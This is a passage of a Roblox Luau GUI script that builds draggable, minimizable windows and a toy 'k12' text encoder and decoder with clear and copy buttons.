uwu["k12 encoder and decoder top bar text padding"] = Instance.new("UIPadding")
uwu["k12 encoder and decoder top bar text padding"].PaddingLeft = UDim.new(0, 0)
uwu["k12 encoder and decoder top bar text padding"].PaddingRight = UDim.new(0, 0)
uwu["k12 encoder and decoder top bar text padding"].Parent = uwu["k12 encoder and decoder tab top bar"]

uwu["k12 encoder and decoder tab top bar"].Parent = uwu["screen gui"]
uwu["k12 encoder and decoder tab top bar"].ZIndex = 803
uwu["k12 encoder and decoder tab top bar"].Visible = false

function dragk12tabtopbar()
	local frame = uwu["k12 encoder and decoder tab top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		uwu["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	uwu["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

dragk12tabtopbar()

-------------------------------------------------------------------------------------------------------------------------------

uwu["k12 encoder and decoder tab top bar close button"].Size = UDim2.new(0, 18, 0, 18)
uwu["k12 encoder and decoder tab top bar close button"].Position = UDim2.new(0, 523, 0, 4.7)

uwu["k12 encoder and decoder tab top bar close button"].BackgroundColor3 = uwu["default background color"]

uwu["k12 encoder and decoder tab top bar close button"].BorderColor3 = uwu["default border color"]
uwu["k12 encoder and decoder tab top bar close button"].BorderSizePixel = 1

uwu["k12 encoder and decoder tab top bar close button"].TextColor3 = uwu["default border color"]
uwu["k12 encoder and decoder tab top bar close button"].Font = Enum.Font.RobotoMono
uwu["k12 encoder and decoder tab top bar close button"].TextSize = 16
uwu["k12 encoder and decoder tab top bar close button"].TextScaled = false
uwu["k12 encoder and decoder tab top bar close button"].Text = "X"
uwu["k12 encoder and decoder tab top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["k12 encoder and decoder tab top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["k12 encoder and decoder tab top bar close button"].Parent = uwu["k12 encoder and decoder tab top bar"]
uwu["k12 encoder and decoder tab top bar close button"].ZIndex = 804

uwu["k12 encoder and decoder tab top bar close button text padding"] = Instance.new("UIPadding")
uwu["k12 encoder and decoder tab top bar close button text padding"].PaddingTop = UDim.new(0, -1)
uwu["k12 encoder and decoder tab top bar close button text padding"].Parent = uwu["k12 encoder and decoder tab top bar close button"]

uwu["k12 encoder and decoder tab top bar close button"].MouseButton1Click:Connect(function()
	if not k12canminimize then return end
	k12tabopen = false
	k12tabminimized = false
	playclicksound()
	uwu["k12 encoder and decoder tab top bar"].Visible = false
	repos(uwu["k12 encoder and decoder tab top bar"], 0, 545, 268 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["k12 encoder and decoder tab top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
uwu["k12 encoder and decoder tab top bar minimize button"].Position = UDim2.new(0, 499, 0, 4.7)

uwu["k12 encoder and decoder tab top bar minimize button"].BackgroundColor3 = uwu["default background color"]

uwu["k12 encoder and decoder tab top bar minimize button"].BorderColor3 = uwu["default border color"]
uwu["k12 encoder and decoder tab top bar minimize button"].BorderSizePixel = 1

uwu["k12 encoder and decoder tab top bar minimize button"].TextColor3 = uwu["default border color"]
uwu["k12 encoder and decoder tab top bar minimize button"].Font = Enum.Font.RobotoMono
uwu["k12 encoder and decoder tab top bar minimize button"].TextSize = 16
uwu["k12 encoder and decoder tab top bar minimize button"].TextScaled = false
uwu["k12 encoder and decoder tab top bar minimize button"].Visible = true
uwu["k12 encoder and decoder tab top bar minimize button"].Text = "-"
uwu["k12 encoder and decoder tab top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["k12 encoder and decoder tab top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["k12 encoder and decoder tab top bar minimize button"].Parent = uwu["k12 encoder and decoder tab top bar"]
uwu["k12 encoder and decoder tab top bar minimize button"].ZIndex = 804

uwu["k12 encoder and decoder tab top bar minimize button text padding"] = Instance.new("UIPadding")
uwu["k12 encoder and decoder tab top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
uwu["k12 encoder and decoder tab top bar minimize button text padding"].Parent = uwu["k12 encoder and decoder tab top bar minimize button"]

k12tabminimized = false
k12canminimize = true

uwu["k12 encoder and decoder tab top bar minimize button"].MouseButton1Click:Connect(function()
	if not k12canminimize then return end
	spawn(playclicksound)
	k12canminimize = false

	k12tabminimized = not k12tabminimized

	if k12tabminimized then
		uwu["k12 encoder and decoder tab top bar minimize button"].Text = "+"
		uwu["k12 encoder and decoder tab block main frame"].Visible = true

		local fadeTween = fade(uwu["k12 encoder and decoder tab block main frame"], 0, 0.2)
		fadeTween.Completed:Wait()
		uwu["k12 encoder and decoder tab main frame 1"].Visible = false

		local tween = tweenSizePosition(
			uwu["k12 encoder and decoder tab block main frame"],
			UDim2.new(0, 545, 0, 0),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()

		k12tabreallyminimized = true
		uwu["k12 encoder and decoder tab block main frame"].Visible = false
	else
		uwu["k12 encoder and decoder tab top bar minimize button"].Text = "-"
		uwu["k12 encoder and decoder tab block main frame"].Visible = true

		local tween = tweenSizePosition(
			uwu["k12 encoder and decoder tab block main frame"],
			UDim2.new(0, 545, 0, 241),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()
		uwu["k12 encoder and decoder tab main frame 1"].Visible = true

		local fadeTween = fade(uwu["k12 encoder and decoder tab block main frame"], 1, 0.2)
		fadeTween.Completed:Wait()

		k12tabreallyminimized = false
		uwu["k12 encoder and decoder tab block main frame"].Visible = false
	end

	k12canminimize = true
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["k12 encoder and decoder tab top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
uwu["k12 encoder and decoder tab top bar reposition button"].Position = UDim2.new(0, 475, 0, 4.7)

uwu["k12 encoder and decoder tab top bar reposition button"].BackgroundColor3 = uwu["default background color"]

uwu["k12 encoder and decoder tab top bar reposition button"].BorderColor3 = uwu["default border color"]
uwu["k12 encoder and decoder tab top bar reposition button"].BorderSizePixel = 1

uwu["k12 encoder and decoder tab top bar reposition button"].TextColor3 = uwu["default border color"]
uwu["k12 encoder and decoder tab top bar reposition button"].Font = Enum.Font.RobotoMono
uwu["k12 encoder and decoder tab top bar reposition button"].TextSize = 16
uwu["k12 encoder and decoder tab top bar reposition button"].TextScaled = false
uwu["k12 encoder and decoder tab top bar reposition button"].Text = "R"
uwu["k12 encoder and decoder tab top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["k12 encoder and decoder tab top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["k12 encoder and decoder tab top bar reposition button"].Parent = uwu["k12 encoder and decoder tab top bar"]
uwu["k12 encoder and decoder tab top bar reposition button"].ZIndex = 804

uwu["k12 encoder and decoder tab top bar reposition button text padding"] = Instance.new("UIPadding")
uwu["k12 encoder and decoder tab top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
uwu["k12 encoder and decoder tab top bar reposition button text padding"].Parent = uwu["k12 encoder and decoder tab top bar reposition button"]

uwu["k12 encoder and decoder tab top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()
	repos(uwu["k12 encoder and decoder tab top bar"], 0.5, 545, 268 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["k12 encoder and decoder tab main frame 1"].Size = UDim2.new(0, 545, 0, 242)
uwu["k12 encoder and decoder tab main frame 1"].Position = UDim2.new(0, 0, 1, 0)

uwu["k12 encoder and decoder tab main frame 1"].BackgroundColor3 = uwu["default background color"]

uwu["k12 encoder and decoder tab main frame 1"].BorderColor3 = uwu["default border color"]
uwu["k12 encoder and decoder tab main frame 1"].BorderSizePixel = 1

uwu["k12 encoder and decoder tab main frame 1"].Parent = uwu["k12 encoder and decoder tab top bar"]
uwu["k12 encoder and decoder tab main frame 1"].ZIndex = 802

-------------------------------------------------------------------------------------------------------------------------------

uwu["k12 encoder and decoder input"].Size = UDim2.new(0, 537, 0, 187)
uwu["k12 encoder and decoder input"].Position = UDim2.new(0, 4, 0, 5)

uwu["k12 encoder and decoder input"].BackgroundColor3 = uwu["default background color"]

uwu["k12 encoder and decoder input"].BorderColor3 = uwu["default border color"]
uwu["k12 encoder and decoder input"].BorderSizePixel = 1

uwu["k12 encoder and decoder input"].Parent = uwu["k12 encoder and decoder tab main frame 1"]
uwu["k12 encoder and decoder input"].ZIndex = 803

uwu["k12 encoder and decoder input"].Font = Enum.Font.RobotoMono
uwu["k12 encoder and decoder input"].TextColor3 = Color3.new(1, 1, 1)
uwu["k12 encoder and decoder input"].TextSize = 15
uwu["k12 encoder and decoder input"].Text = ""
uwu["k12 encoder and decoder input"].PlaceholderText = "input message"
uwu["k12 encoder and decoder input"].PlaceholderColor3 = uwu["default 1/2 color"]
uwu["k12 encoder and decoder input"].TextWrapped = true
uwu["k12 encoder and decoder input"].ClearTextOnFocus = false
uwu["k12 encoder and decoder input"].TextXAlignment = Enum.TextXAlignment.Left
uwu["k12 encoder and decoder input"].TextYAlignment = Enum.TextYAlignment.Top
uwu["k12 encoder and decoder input"].ClipsDescendants = true

uwu["k12 encoder and decoder input text padding"] = Instance.new("UIPadding")
uwu["k12 encoder and decoder input text padding"].PaddingBottom = UDim.new(0, 4)
uwu["k12 encoder and decoder input text padding"].PaddingLeft = UDim.new(0, 4)
uwu["k12 encoder and decoder input text padding"].PaddingRight = UDim.new(0, 4)
uwu["k12 encoder and decoder input text padding"].PaddingTop = UDim.new(0, 4)
uwu["k12 encoder and decoder input text padding"].Parent = uwu["k12 encoder and decoder input"]

uwu["k12 encode"].Size = UDim2.new(0, 160, 0, 41)
uwu["k12 encode"].Position = UDim2.new(0, 4, 0, 197)

uwu["k12 encode"].BackgroundColor3 = uwu["default background color"]

uwu["k12 encode"].BorderColor3 = uwu["default border color"]
uwu["k12 encode"].BorderSizePixel = 1

uwu["k12 encode"].Parent = uwu["k12 encoder and decoder tab main frame 1"]
uwu["k12 encode"].ZIndex = 803

uwu["k12 encode"].Font = Enum.Font.RobotoMono
uwu["k12 encode"].TextColor3 = Color3.new(1, 1, 1)
uwu["k12 encode"].TextSize = 15
uwu["k12 encode"].Text = "encode"
uwu["k12 encode"].TextWrapped = true
uwu["k12 encode"].TextXAlignment = Enum.TextXAlignment.Center
uwu["k12 encode"].TextYAlignment = Enum.TextYAlignment.Center
uwu["k12 encode"].ClipsDescendants = true

uwu["k12 encode text padding"] = Instance.new("UIPadding")
uwu["k12 encode text padding"].PaddingBottom = UDim.new(0, 0)
uwu["k12 encode text padding"].Parent = uwu["reverse message"]

uwu["k12 decode"].Size = UDim2.new(0, 160, 0, 41)
uwu["k12 decode"].Position = UDim2.new(0, 169, 0, 197)

uwu["k12 decode"].BackgroundColor3 = uwu["default background color"]

uwu["k12 decode"].BorderColor3 = uwu["default border color"]
uwu["k12 decode"].BorderSizePixel = 1

uwu["k12 decode"].Parent = uwu["k12 encoder and decoder tab main frame 1"]
uwu["k12 decode"].ZIndex = 803

uwu["k12 decode"].Font = Enum.Font.RobotoMono
uwu["k12 decode"].TextColor3 = Color3.new(1, 1, 1)
uwu["k12 decode"].TextSize = 15
uwu["k12 decode"].Text = "decode"
uwu["k12 decode"].TextWrapped = true
uwu["k12 decode"].TextXAlignment = Enum.TextXAlignment.Center
uwu["k12 decode"].TextYAlignment = Enum.TextYAlignment.Center
uwu["k12 decode"].ClipsDescendants = true

uwu["k12 decode text padding"] = Instance.new("UIPadding")
uwu["k12 decode text padding"].PaddingBottom = UDim.new(0, 0)
uwu["k12 decode text padding"].Parent = uwu["reverse message"]

uwu["clear k12 encoder and decoder input"].Size = UDim2.new(0, 101, 0, 41)
uwu["clear k12 encoder and decoder input"].Position = UDim2.new(0, 334, 0, 197)

uwu["clear k12 encoder and decoder input"].BackgroundColor3 = uwu["default background color"]

uwu["clear k12 encoder and decoder input"].BorderColor3 = uwu["default border color"]
uwu["clear k12 encoder and decoder input"].BorderSizePixel = 1

uwu["clear k12 encoder and decoder input"].Parent = uwu["k12 encoder and decoder tab main frame 1"]
uwu["clear k12 encoder and decoder input"].ZIndex = 803

uwu["clear k12 encoder and decoder input"].Font = Enum.Font.RobotoMono
uwu["clear k12 encoder and decoder input"].TextColor3 = Color3.new(1, 1, 1)
uwu["clear k12 encoder and decoder input"].TextSize = 15
uwu["clear k12 encoder and decoder input"].Text = "clear"
uwu["clear k12 encoder and decoder input"].TextWrapped = true
uwu["clear k12 encoder and decoder input"].TextXAlignment = Enum.TextXAlignment.Center
uwu["clear k12 encoder and decoder input"].TextYAlignment = Enum.TextYAlignment.Center
uwu["clear k12 encoder and decoder input"].ClipsDescendants = true

uwu["clear k12 encoder and decoder input text padding"] = Instance.new("UIPadding")
uwu["clear k12 encoder and decoder input text padding"].PaddingBottom = UDim.new(0, 0)
uwu["clear k12 encoder and decoder input text padding"].Parent = uwu["clear k12 encoder and decoder input"]

uwu["copy k12 encoder and decoder input"].Size = UDim2.new(0, 101, 0, 41)
uwu["copy k12 encoder and decoder input"].Position = UDim2.new(0, 440, 0, 197)

uwu["copy k12 encoder and decoder input"].BackgroundColor3 = uwu["default background color"]

uwu["copy k12 encoder and decoder input"].BorderColor3 = uwu["default border color"]
uwu["copy k12 encoder and decoder input"].BorderSizePixel = 1

uwu["copy k12 encoder and decoder input"].Parent = uwu["k12 encoder and decoder tab main frame 1"]
uwu["copy k12 encoder and decoder input"].ZIndex = 803

uwu["copy k12 encoder and decoder input"].Font = Enum.Font.RobotoMono
uwu["copy k12 encoder and decoder input"].TextColor3 = Color3.new(1, 1, 1)
uwu["copy k12 encoder and decoder input"].TextSize = 15
uwu["copy k12 encoder and decoder input"].Text = "copy"
uwu["copy k12 encoder and decoder input"].TextWrapped = true
uwu["copy k12 encoder and decoder input"].TextXAlignment = Enum.TextXAlignment.Center
uwu["copy k12 encoder and decoder input"].TextYAlignment = Enum.TextYAlignment.Center
uwu["copy k12 encoder and decoder input"].ClipsDescendants = true

uwu["copy k12 encoder and decoder input text padding"] = Instance.new("UIPadding")
uwu["copy k12 encoder and decoder input text padding"].PaddingBottom = UDim.new(0, 0)
uwu["copy k12 encoder and decoder input text padding"].Parent = uwu["copy k12 encoder and decoder input"]

local MULTIPLIER = 51

function charToA1Z26(c)
	if c == " " then
		return "00", false
	end
	local isUpper = c:match("%u") ~= nil
	local byte = string.byte(c:upper())
	if byte >= 65 and byte <= 90 then
		local index = byte - 64
		return (index < 10 and "0" or "") .. tostring(index), isUpper
	else
		return "", false
	end
end

function reverseStr(str)
	return string.reverse(str)
end

function padTwoDigits(num)
	num = num % 100
	return (num < 10 and "0" or "") .. tostring(num)
end

local function toHex(numStr)
	local num = tonumber(numStr)
	if not num then return "00" end
	local hex = string.format("%02X", num)
	return hex
end

local function hexToTwoChars(hexStr)
	local output = {}
	for i = 1, #hexStr do
		local hexDigit = hexStr:sub(i,i)
		local val = tonumber(hexDigit, 16)
		table.insert(output, string.char(65 + val))
	end
	return table.concat(output)
end

function encodeInput(input)
	local encodedParts = {}

	for i = 1, #input do
		local c = input:sub(i, i)
		local a1z26, isUpper = charToA1Z26(c)
		if a1z26 ~= "" then
			local hex = toHex(a1z26)
			local pairChars = hexToTwoChars(hex)

			local combinedValue = (string.byte(pairChars, 1) + string.byte(pairChars, 2)) % 100

			local reversed = reverseStr(tostring(combinedValue))
			local multiplied = (tonumber(reversed) * MULTIPLIER) % 100

			if isUpper then
				multiplied = (multiplied + 3) % 100
			end

			local encodedStr = padTwoDigits(multiplied)
			table.insert(encodedParts, encodedStr)
		end
	end

	local reversedOutput = {}
	for i = #encodedParts, 1, -1 do
		reversedOutput[i] = "x" .. encodedParts[i] .. "."
	end

	local result = table.concat(reversedOutput)
	if result:sub(-1) == "." then
		result = result:sub(1, -2)
	end
	return result
end

function decodeInput(encoded)
	local encodedGroups = {}
	for numStr in encoded:gmatch("x(%d%d)") do
		encodedGroups[#encodedGroups + 1] = numStr
	end

	local groups = {}
	for i = #encodedGroups, 1, -1 do
		groups[#groups + 1] = encodedGroups[i]
	end

	local resultChars = {}

	for _, grp in ipairs(groups) do
		local target = tonumber(grp)
		local found = false

		for a1z = 0, 26 do
			local decStr = padTwoDigits(a1z)
			local hex = toHex(decStr)
			local pair = hexToTwoChars(hex)

			local b1 = string.byte(pair, 1) or 65
			local b2 = string.byte(pair, 2) or 65
			local combinedValue = (b1 + b2) % 100

			local rev = reverseStr(tostring(combinedValue))
			local revNum = tonumber(rev) or 0

			local baseMult = (revNum * MULTIPLIER) % 100

			local attempts = {
				{val = baseMult, upper = false},
				{val = (baseMult + 3) % 100, upper = true},
			}

			for _, a in ipairs(attempts) do
				if a.val == target then
					if a1z == 0 then
						resultChars[#resultChars + 1] = " "
					else
						local ch = string.char(a1z + 64)
						if not a.upper then
							ch = ch:lower()
						end
						resultChars[#resultChars + 1] = ch
					end
					found = true
					break
				end
			end

			if found then break end
		end

		if not found then
			resultChars[#resultChars + 1] = "?"
		end
	end

	local decodedString = table.concat(resultChars)
	return reverseStr(decodedString)
end

uwu["clear k12 encoder and decoder input"].MouseButton1Click:Connect(function()
	playclicksound()
	uwu["k12 encoder and decoder input"].Text = ""
end)

uwu["copy k12 encoder and decoder input"].MouseButton1Click:Connect(function()
	playclicksound()
	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)

	local function copytoclipboard(txt)
		if everyClipboard then
			everyClipboard(tostring(txt))
			unablenotify("copied to clipboard.")
		else
			unablenotify("unable to access clipboard.")
		end
	end
	copytoclipboard(uwu["k12 encoder and decoder input"].Text)
end)

uwu["k12 encode"].MouseButton1Click:Connect(function()
	playclicksound()
	uwu["k12 encoder and decoder input"].Text = encodeInput(uwu["k12 encoder and decoder input"].Text)
end)

uwu["k12 decode"].MouseButton1Click:Connect(function()
	playclicksound()
	uwu["k12 encoder and decoder input"].Text = decodeInput(uwu["k12 encoder and decoder input"].Text)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["k12 encoder and decoder tab block main frame"].Size = UDim2.new(0, 575, 0, 268)
uwu["k12 encoder and decoder tab block main frame"].Position = UDim2.new(0, 0, 1, 1)

uwu["k12 encoder and decoder tab block main frame"].BackgroundColor3 = uwu["default background color"]

uwu["k12 encoder and decoder tab block main frame"].BorderColor3 = uwu["default border color"]
uwu["k12 encoder and decoder tab block main frame"].BorderSizePixel = 1
uwu["k12 encoder and decoder tab block main frame"].BackgroundTransparency = 1

uwu["k12 encoder and decoder tab block main frame"].Parent = uwu["k12 encoder and decoder tab top bar"]
uwu["k12 encoder and decoder tab block main frame"].ZIndex = 804
uwu["k12 encoder and decoder tab block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["k12 encoder and decoder tab block all"].Size = UDim2.new(0, 545, 0, 270)
uwu["k12 encoder and decoder tab block all"].Position = UDim2.new(0, 0, 0, 0)

uwu["k12 encoder and decoder tab block all"].BackgroundColor3 = uwu["default background color"]

uwu["k12 encoder and decoder tab block all"].BorderColor3 = uwu["default border color"]
uwu["k12 encoder and decoder tab block all"].BorderSizePixel = 1
uwu["k12 encoder and decoder tab block all"].BackgroundTransparency = 0

uwu["k12 encoder and decoder tab block all"].Parent = uwu["k12 encoder and decoder tab top bar"]
uwu["k12 encoder and decoder tab block all"].ZIndex = 805
uwu["k12 encoder and decoder tab block all"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["top bar close button"].Size = UDim2.new(0, 18, 0, 18)
uwu["top bar close button"].Position = UDim2.new(0, 379, 0, 4.7)

uwu["top bar close button"].BackgroundColor3 = uwu["default background color"]

uwu["top bar close button"].BorderColor3 = uwu["default border color"]
uwu["top bar close button"].BorderSizePixel = 1

uwu["top bar close button"].TextColor3 = uwu["default border color"]
uwu["top bar close button"].Font = Enum.Font.RobotoMono
uwu["top bar close button"].TextSize = 16
uwu["top bar close button"].TextScaled = false
uwu["top bar close button"].Text = "X"
uwu["top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["top bar close button"].Parent = uwu["top bar"]
uwu["top bar close button"].ZIndex = 20

uwu["top bar close button text padding"] = Instance.new("UIPadding")
uwu["top bar close button text padding"].PaddingTop = UDim.new(0, -1)
uwu["top bar close button text padding"].Parent = uwu["top bar close button"]

uwu["top bar close button"].MouseButton1Click:Connect(function()
	if not canpress then return end
	playclicksound()

	uwu["top bar"].Visible = not uwu["top bar"].Visible

	if uwu["top bar"].Visible then
		if minimized then return end
		canpress = false
		local tweens = {}
		for name, offset in pairs(showOffsets) do
			local smallButton = uwu[name]
			smallButton.Visible = true
			if uwu["unlocked"] == false then canpress = true end
			local targetPosition = originalPositions[name] + offset
			local targetRotation = 0
			local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
			table.insert(tweens, tween)
		end
	else
		if minimized then return end
		canpress = false
		for name, _ in pairs(showOffsets) do
			randomRotations[name] = getRandomRotation()
		end

		local tweens = {}
		for name, _ in pairs(showOffsets) do
			local smallButton = uwu[name]
			if uwu["unlocked"] == false then canpress = true end
			local targetPosition = originalPositions[name]
			local targetRotation = randomRotations[name]
			local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
			tween.Completed:Connect(function()
				smallButton.Visible = false
			end)
			table.insert(tweens, tween)
		end

		for _, tween in ipairs(tweens) do
			tween.Completed:Wait() canpress = true
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
uwu["top bar minimize button"].Position = UDim2.new(0, 355, 0, 4.7)

uwu["top bar minimize button"].BackgroundColor3 = uwu["default background color"]

uwu["top bar minimize button"].BorderColor3 = uwu["default border color"]
uwu["top bar minimize button"].BorderSizePixel = 1

uwu["top bar minimize button"].TextColor3 = uwu["default border color"]
uwu["top bar minimize button"].Font = Enum.Font.RobotoMono
uwu["top bar minimize button"].TextSize = 16
uwu["top bar minimize button"].TextScaled = false
uwu["top bar minimize button"].Visible = false
uwu["top bar minimize button"].Text = "-"
uwu["top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["top bar minimize button"].Parent = uwu["top bar"]
uwu["top bar minimize button"].ZIndex = 20

uwu["top bar minimize button text padding"] = Instance.new("UIPadding")
uwu["top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
uwu["top bar minimize button text padding"].Parent = uwu["top bar minimize button"]

canminimize = true

function fade(object, targetTransparency, duration)
	local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
	local tween = uwu["tween service"]:Create(object, tweenInfo, {BackgroundTransparency = targetTransparency})
	tween:Play()
	return tween
end

function tweenSizePosition(object, targetSize, targetPosition, duration)
	local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
	local tween = uwu["tween service"]:Create(object, tweenInfo, {Size = targetSize, Position = targetPosition})
	tween:Play()
	return tween
end

uwu["top bar minimize button"].MouseButton1Click:Connect(function()
	if not canminimize then return end
	canpress = false
	canpress2 = false
	playclicksound()

	minimized = not minimized
	canminimize = false

	if minimized then
		uwu["top bar minimize button"].Text = "+"

		spawn(function()
			for name, _ in pairs(showOffsets) do
				randomRotations[name] = getRandomRotation()
			end

			local tweens = {}
			for name, _ in pairs(showOffsets) do
				local smallButton = uwu[name]
				local targetPosition = originalPositions[name]
				local targetRotation = randomRotations[name]
				local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
				tween.Completed:Connect(function()
					smallButton.Visible = false
				end)
				table.insert(tweens, tween)
			end
			for _, tween in ipairs(tweens) do
				tween.Completed:Wait()
			end
		end)

		uwu["block main frame"].BackgroundTransparency = 1
		uwu["block main frame"].Visible = true
		local fadeTween = fade(uwu["block main frame"], 0, 0.2)

		fadeTween.Completed:Wait()

		uwu["main frame 1"].Visible = false
		uwu["main frame 2"].Visible = false
		uwu["main frame 3"].Visible = false
		uwu["main frame 4"].Visible = false
		uwu["password frame"].Visible = false

		local tween = tweenSizePosition(uwu["block main frame"], UDim2.new(0, 401, 0, 0), UDim2.new(0, 0, 1, 1), 0.5)

		tween.Completed:Wait()

		uwu["block main frame"].Visible = false
		uwu["emoticon"] = ">.<"
		local old = uwu["top bar"].Text:gsub("[%s]*[>%.o<]+$", "")
		uwu["top bar"].Text = old .. " " .. uwu["emoticon"]
	else
		spawn(function()
			local tweens = {}
			for name, offset in pairs(showOffsets) do
				local smallButton = uwu[name]
				smallButton.Visible = true
				local targetPosition = originalPositions[name] + offset
				local targetRotation = 0
				local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
				table.insert(tweens, tween)
			end
			for _, tween in ipairs(tweens) do
				tween.Completed:Wait()
			end
		end)

		uwu["top bar minimize button"].Text = "-"

		uwu["block main frame"].Visible = true
		local tween = tweenSizePosition(uwu["block main frame"], UDim2.new(0, 401, 0, 249), UDim2.new(0, 0, 1, 1), 0.5)

		tween.Completed:Wait()

		if uwu["unlocked"] == true then
			uwu["password frame"].Visible = false
		else
			uwu["password frame"].Visible = true
		end
		uwu[lastVisibleFrame].Visible = true

		local fadeTween = fade(uwu["block main frame"], 1, 0.2)

		fadeTween.Completed:Wait()

		uwu["block main frame"].Visible = false
		uwu["emoticon"] = "o.o"
		local old = uwu["top bar"].Text:gsub("[%s]*[>%.o<]+$", "")
		uwu["top bar"].Text = old .. " " .. uwu["emoticon"]
	end

	canminimize = true
	canpress2 = true
	canpress = true
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
uwu["top bar reposition button"].Position = UDim2.new(0, 355, 0, 4.7)

uwu["top bar reposition button"].BackgroundColor3 = uwu["default background color"]

uwu["top bar reposition button"].BorderColor3 = uwu["default border color"]
uwu["top bar reposition button"].BorderSizePixel = 1

uwu["top bar reposition button"].TextColor3 = uwu["default border color"]
uwu["top bar reposition button"].Font = Enum.Font.RobotoMono
uwu["top bar reposition button"].TextSize = 16
uwu["top bar reposition button"].TextScaled = false
uwu["top bar reposition button"].Text = "R"
uwu["top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["top bar reposition button"].Parent = uwu["top bar"]
uwu["top bar reposition button"].ZIndex = 21

uwu["top bar reposition button text padding"] = Instance.new("UIPadding")
uwu["top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
uwu["top bar reposition button text padding"].Parent = uwu["top bar reposition button"]

uwu["top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()
	repos(uwu["top bar"], 0.5, 401, 250 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["main frame 1"].Size = UDim2.new(0, 401, 0, 250)
uwu["main frame 1"].Position = UDim2.new(0, 0, 1, 0)

uwu["main frame 1"].BackgroundColor3 = uwu["default background color"]

uwu["main frame 1"].BorderColor3 = uwu["default border color"]
uwu["main frame 1"].BorderSizePixel = 1

uwu["main frame 1"].Parent = uwu["top bar"]
uwu["main frame 1"].ZIndex = 18

-------------------------------------------------------------------------------------------------------------------------------

uwu["main frame 2"].Size = UDim2.new(0, 401, 0, 249)
uwu["main frame 2"].Position = UDim2.new(0, 0, 1, 1)

uwu["main frame 2"].BackgroundColor3 = uwu["default background color"]

uwu["main frame 2"].BorderColor3 = uwu["default border color"]
uwu["main frame 2"].BorderSizePixel = 1

uwu["main frame 2"].Parent = uwu["top bar"]
uwu["main frame 2"].ZIndex = 20
uwu["main frame 2"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["main frame 3"].Size = UDim2.new(0, 401, 0, 249)
uwu["main frame 3"].Position = UDim2.new(0, 0, 1, 1)

uwu["main frame 3"].BackgroundColor3 = uwu["default background color"]

uwu["main frame 3"].BorderColor3 = uwu["default border color"]
uwu["main frame 3"].BorderSizePixel = 1

uwu["main frame 3"].Parent = uwu["top bar"]
uwu["main frame 3"].ZIndex = 22
uwu["main frame 3"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["main frame 4"].Size = UDim2.new(0, 401, 0, 249)
uwu["main frame 4"].Position = UDim2.new(0, 0, 1, 1)

uwu["main frame 4"].BackgroundColor3 = uwu["default background color"]

uwu["main frame 4"].BorderColor3 = uwu["default border color"]
uwu["main frame 4"].BorderSizePixel = 1

uwu["main frame 4"].Parent = uwu["top bar"]
uwu["main frame 4"].ZIndex = 24
uwu["main frame 4"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["block main frame"].Size = UDim2.new(0, 401, 0, 249)
uwu["block main frame"].Position = UDim2.new(0, 0, 1, 1)

uwu["block main frame"].BackgroundColor3 = uwu["default background color"]

uwu["block main frame"].BorderColor3 = uwu["default border color"]
uwu["block main frame"].BorderSizePixel = 1

uwu["block main frame"].Parent = uwu["top bar"]
uwu["block main frame"].ZIndex = 48
uwu["block main frame"].Visible = false

